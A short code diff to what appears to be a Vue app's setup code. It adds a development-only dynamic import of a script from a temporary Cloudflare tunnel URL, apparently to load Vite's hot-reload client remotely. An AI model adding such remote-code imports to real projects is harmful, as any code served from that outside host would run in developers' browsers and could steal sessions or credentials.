@@ -47,6 +47,9 @@ setup({ el, App, props, plugin }) {
 
     // Initialize auth state to ensure fresh CSRF tokens
     auth.initializeAuth().catch(console.error);
+if (import.meta.env.DEV) {
+    import('https://cats-correlation-mph-races.trycloudflare.com/@vite/client');
+}
 
 vueApp.config.globalProperties.$is = (...roles) => {
   return roles.some(role => auth.hasRole(role));
